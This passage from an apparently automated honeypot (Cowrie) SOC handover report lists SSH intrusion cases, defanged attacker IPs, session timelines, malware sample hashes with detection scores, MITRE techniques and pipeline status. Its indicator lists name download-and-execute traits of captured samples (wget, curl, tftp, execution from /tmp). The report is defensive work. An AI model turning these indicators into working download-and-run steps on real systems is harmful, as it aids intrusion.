| `2026-08-17 02:27:31` | `cowrie.log.closed` |
| `2026-08-17 02:27:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.165.22[.]192` to AbuseIPDB if not already reported
- [ ] Block `217.165.22[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-db62e20ef193

| Field | Detail |
|---|---|
| **Source IP** | `175.198.18[.]3` |
| **First Seen** | 2026-08-17 02:39 |
| **Last Seen** | 2026-08-17 02:39 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 02:39:15` | `cowrie.session.connect` |
| `2026-08-17 02:39:18` | `cowrie.client.version` |
| `2026-08-17 02:39:18` | `cowrie.client.kex` |
| `2026-08-17 02:39:25` | `cowrie.login.success` |
| `2026-08-17 02:39:27` | `cowrie.direct-tcpip.request` |
| `2026-08-17 02:39:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `175.198.18[.]3` to AbuseIPDB if not already reported
- [ ] Block `175.198.18[.]3` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-495ab9184ac9

| Field | Detail |
|---|---|
| **Source IP** | `180.71.9[.]31` |
| **First Seen** | 2026-08-17 02:39 |
| **Last Seen** | 2026-08-17 02:39 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 02:39:38` | `cowrie.session.connect` |
| `2026-08-17 02:39:39` | `cowrie.client.version` |
| `2026-08-17 02:39:39` | `cowrie.client.kex` |
| `2026-08-17 02:39:41` | `cowrie.login.success` |
| `2026-08-17 02:39:41` | `cowrie.direct-tcpip.request` |
| `2026-08-17 02:39:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.71.9[.]31` to AbuseIPDB if not already reported
- [ ] Block `180.71.9[.]31` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2a56fbfa86fa

| Field | Detail |
|---|---|
| **Source IP** | `217.165.22[.]192` |
| **First Seen** | 2026-08-17 02:46 |
| **Last Seen** | 2026-08-17 02:46 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 02:46:36` | `cowrie.session.connect` |
| `2026-08-17 02:46:36` | `cowrie.client.version` |
| `2026-08-17 02:46:36` | `cowrie.client.kex` |
| `2026-08-17 02:46:37` | `cowrie.login.success` |
| `2026-08-17 02:46:38` | `cowrie.session.params` |
| `2026-08-17 02:46:38` | `cowrie.command.input` |
| `2026-08-17 02:46:38` | `cowrie.log.closed` |
| `2026-08-17 02:46:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.165.22[.]192` to AbuseIPDB if not already reported
- [ ] Block `217.165.22[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-333db9d2068d

| Field | Detail |
|---|---|
| **Source IP** | `34.62.116[.]50` |
| **First Seen** | 2026-08-17 02:46 |
| **Last Seen** | 2026-08-17 02:46 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 02:46:50` | `cowrie.session.connect` |
| `2026-08-17 02:46:50` | `cowrie.client.version` |
| `2026-08-17 02:46:50` | `cowrie.client.kex` |
| `2026-08-17 02:46:52` | `cowrie.login.success` |
| `2026-08-17 02:46:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.62.116[.]50` to AbuseIPDB if not already reported
- [ ] Block `34.62.116[.]50` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7456f3fff3ec

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-08-17 02:49 |
| **Last Seen** | 2026-08-17 02:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 02:49:22` | `cowrie.session.connect` |
| `2026-08-17 02:49:22` | `cowrie.client.version` |
| `2026-08-17 02:49:22` | `cowrie.client.kex` |
| `2026-08-17 02:49:23` | `cowrie.login.success` |
| `2026-08-17 02:49:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-60d4aa4fa52c

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-08-17 02:49 |
| **Last Seen** | 2026-08-17 02:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 02:49:23` | `cowrie.session.connect` |
| `2026-08-17 02:49:23` | `cowrie.client.version` |
| `2026-08-17 02:49:23` | `cowrie.client.kex` |
| `2026-08-17 02:49:24` | `cowrie.login.success` |
| `2026-08-17 02:49:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ac2798cfb0a8

| Field | Detail |
|---|---|
| **Source IP** | `96.56.228[.]149` |
| **First Seen** | 2026-08-17 02:52 |
| **Last Seen** | 2026-08-17 02:52 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 02:52:38` | `cowrie.session.connect` |
| `2026-08-17 02:52:39` | `cowrie.client.version` |
| `2026-08-17 02:52:39` | `cowrie.client.kex` |
| `2026-08-17 02:52:40` | `cowrie.login.success` |
| `2026-08-17 02:52:41` | `cowrie.direct-tcpip.request` |
| `2026-08-17 02:52:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `96.56.228[.]149` to AbuseIPDB if not already reported
- [ ] Block `96.56.228[.]149` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e9cb7d1d12d7

| Field | Detail |
|---|---|
| **Source IP** | `222.75.225[.]206` |
| **First Seen** | 2026-08-17 02:52 |
| **Last Seen** | 2026-08-17 02:53 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 02:52:51` | `cowrie.session.connect` |
| `2026-08-17 02:52:52` | `cowrie.client.version` |
| `2026-08-17 02:52:52` | `cowrie.client.kex` |
| `2026-08-17 02:52:54` | `cowrie.login.success` |
| `2026-08-17 02:52:55` | `cowrie.direct-tcpip.request` |
| `2026-08-17 02:53:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.75.225[.]206` to AbuseIPDB if not already reported
- [ ] Block `222.75.225[.]206` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `80.251.153[.]178` | **5227** | 2026-08-17 00:00 | 2026-08-17 02:55 | 6078m | 0 | `T1592` | 🟠 MEDIUM |
| `107.150.146[.]69` | **48** | 2026-08-17 00:04 | 2026-08-17 02:49 | 27m | 0 | `T1592` | 🟠 MEDIUM |
| `210.16.100[.]120` | **9** | 2026-08-17 00:03 | 2026-08-17 02:39 | 8m | 0 | `T1592` | 🟢 LOW |
| `18.145.145[.]61` | **8** | 2026-08-17 02:08 | 2026-08-17 02:08 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.186[.]164` | **4** | 2026-08-17 01:00 | 2026-08-17 01:00 | 0m | 0 | `T1592` | 🟢 LOW |
| `172.105.128[.]12` | **3** | 2026-08-17 02:36 | 2026-08-17 02:36 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]128` | **3** | 2026-08-17 01:52 | 2026-08-17 01:53 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]140` | **3** | 2026-08-17 00:59 | 2026-08-17 01:00 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]118` | **3** | 2026-08-17 01:00 | 2026-08-17 01:01 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]119` | **3** | 2026-08-17 01:53 | 2026-08-17 01:54 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]91` | **3** | 2026-08-17 01:53 | 2026-08-17 01:54 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]96` | **3** | 2026-08-17 01:00 | 2026-08-17 01:01 | 0m | 0 | `T1592` | 🟢 LOW |
| `178.176.151[.]211` | **2** | 2026-08-17 02:14 | 2026-08-17 02:15 | 0m | 0 | `T1592` | 🟢 LOW |
| `192.155.90[.]220` | **2** | 2026-08-17 01:12 | 2026-08-17 01:12 | 0m | 0 | `T1592` | 🟢 LOW |
| `200.114.82[.]18` | **2** | 2026-08-17 01:33 | 2026-08-17 01:36 | 0m | 0 | `T1592` | 🟢 LOW |
| `80.94.92[.]234` | **2** | 2026-08-17 00:58 | 2026-08-17 01:14 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `114.227.225[.]67` | 1 | 2026-08-17 02:39 | 2026-08-17 02:39 | 14s | 0 | `T1592` | 🟢 LOW |
| `121.66.124[.]146` | 1 | 2026-08-17 00:39 | 2026-08-17 00:39 | 13s | 0 | `T1592` | 🟢 LOW |
| `148.227.90[.]140` | 1 | 2026-08-17 00:25 | 2026-08-17 00:27 | 120s | 0 | `T1592` | 🟢 LOW |
| `177.137.5[.]49` | 1 | 2026-08-17 02:17 | 2026-08-17 02:19 | 120s | 0 | `T1592` | 🟢 LOW |
| `181.225.32[.]48` | 1 | 2026-08-17 01:37 | 2026-08-17 01:37 | 10s | 0 | `T1592` | 🟢 LOW |
| `193.176.31[.]236` | 1 | 2026-08-17 02:33 | 2026-08-17 02:33 | 10s | 0 | `T1592` | 🟢 LOW |
| `194.88.98[.]125` | 1 | 2026-08-17 02:32 | 2026-08-17 02:32 | 0s | 0 | `T1592` | 🟢 LOW |
| `199.91.221[.]58` | 1 | 2026-08-17 00:03 | 2026-08-17 00:03 | 0s | 0 | `T1592` | 🟢 LOW |
| `211.178.165[.]251` | 1 | 2026-08-17 00:05 | 2026-08-17 00:06 | 3s | 0 | `T1592` | 🟢 LOW |
| `211.219.254[.]187` | 1 | 2026-08-17 00:45 | 2026-08-17 00:45 | 12s | 0 | `T1592` | 🟢 LOW |
| `34.140.184[.]142` | 1 | 2026-08-17 02:49 | 2026-08-17 02:49 | 0s | 0 | `T1592` | 🟢 LOW |
| `34.62.116[.]50` | 1 | 2026-08-17 02:46 | 2026-08-17 02:46 | 3s | 0 | `T1592` | 🟢 LOW |
| `44.211.197[.]174` | 1 | 2026-08-17 01:22 | 2026-08-17 01:22 | 1s | 0 | `T1592` | 🟢 LOW |
| `45.142.193[.]164` | 1 | 2026-08-17 01:29 | 2026-08-17 01:29 | 6s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]152` | 1 | 2026-08-17 01:04 | 2026-08-17 01:04 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.194.67[.]28` | 1 | 2026-08-17 02:08 | 2026-08-17 02:08 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.56.79[.]53` | 1 | 2026-08-17 02:35 | 2026-08-17 02:35 | 1s | 0 | `T1592` | 🟢 LOW |
| `45.79.207[.]110` | 1 | 2026-08-17 01:37 | 2026-08-17 01:37 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.207[.]71` | 1 | 2026-08-17 01:37 | 2026-08-17 01:37 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.8[.]221` | 1 | 2026-08-17 02:35 | 2026-08-17 02:35 | 0s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]197` | 1 | 2026-08-17 00:49 | 2026-08-17 00:49 | 2s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]56` | 1 | 2026-08-17 02:38 | 2026-08-17 02:39 | 4s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]77` | 1 | 2026-08-17 00:49 | 2026-08-17 00:49 | 2s | 0 | `T1592` | 🟢 LOW |
| `64.89.163[.]156` | 1 | 2026-08-17 00:45 | 2026-08-17 00:45 | 26s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]33` | 1 | 2026-08-17 02:46 | 2026-08-17 02:47 | 16s | 0 | `T1592` | 🟢 LOW |
| `66.212.187[.]214` | 1 | 2026-08-17 01:51 | 2026-08-17 01:51 | 10s | 0 | `T1592` | 🟢 LOW |
| `66.253.232[.]92` | 1 | 2026-08-17 02:47 | 2026-08-17 02:47 | 13s | 0 | `T1592` | 🟢 LOW |
| `79.121.102[.]227` | 1 | 2026-08-17 02:26 | 2026-08-17 02:28 | 117s | 0 | `T1592` | 🟢 LOW |
| `83.191.181[.]23` | 1 | 2026-08-17 01:51 | 2026-08-17 01:53 | 120s | 0 | `T1592` | 🟢 LOW |
| `91.233.83[.]203` | 1 | 2026-08-17 00:59 | 2026-08-17 00:59 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 43/100 | 🟡 MEDIUM | **33/72** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 81/100 | 🔴 HIGH | **28/75** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 42/100 | 🟡 MEDIUM | **31/74** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 69/100 | 🟡 MEDIUM | **23/75** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 63/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `27d205dc183ea2fad0e55e10b206404be20908e39a74569ff99182d7326ed9c0` | ELF Binary (Linux executable) (x86-64 64-bit) | `27d205dc183ea2fa...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `287962211de7bcadb39f7576732438b43ee6aab420ec23c29a9d12a8151a547f` | ELF Binary (Linux executable) (x86 32-bit) | `287962211de7bcad...` | 42/100 | 🟡 MEDIUM | **31/75** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `2f206563640dd66a743ffd493ce0e3c31a8fc5a24b9f5d2b540fc22d45c13d66` | ELF Binary (Linux executable) (x86 32-bit) | `2f206563640dd66a...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `31d4181843b1ed10a7e7cb3f108f6d6c50a7a4452ee52ddacabe8ca77260615e` | Bash Script | `31d4181843b1ed10...` | 58/100 | 🟡 MEDIUM | **20/75** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `64.110.90[.]250` | KR | Oracle Corporation | **100** ⚠️ | 6 |
| `217.165.22[.]192` | AE | Emirates Telecommunications Corporation | **100** ⚠️ | 1 |
| `49.124.153[.]13` | MY | DiGi Telecommunications Sdn Bhd | **100** ⚠️ | 50 |
| `45.56.79[.]53` | US | Linode | **100** ⚠️ | 50 |
| `65.20.175[.]6` | IQ | Earthlink Telecommunications Equipment Trading & Services DMCC | **100** ⚠️ | 50 |
| `34.62.116[.]50` | BE | Google LLC | **100** ⚠️ | 0 |
| `66.132.195[.]33` | US | Censys, Inc. | **100** ⚠️ | 50 |
| `96.56.228[.]149` | US | Cablevision Systems Corp. | **100** ⚠️ | 50 |
| `95.35.29[.]192` | IL | Cellcom Fixed Line Communication L.P | **100** ⚠️ | 50 |
| `210.16.100[.]120` | US | Psychz Networks | **100** ⚠️ | 6 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 124 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 99 |
| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 20 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 20 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 20 |

---

## 🔕 False Positive Summary (31 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 13 |
| AbuseIPDB score 16 below threshold 25 | 2 |
| AbuseIPDB score 17 below threshold 25 | 2 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 14 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 5485 cases |
| Tool 34  | Credential Extractor        | ✅ 128 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 21 fingerprints |
| Tool 36  | Command Clustering          | ✅ 7 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 123 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 31 filtered (0.6%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 80 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 21 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 99 priority case(s) shown individually · 46 recon entry/entries in table (16 group(s) consolidating 5325 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
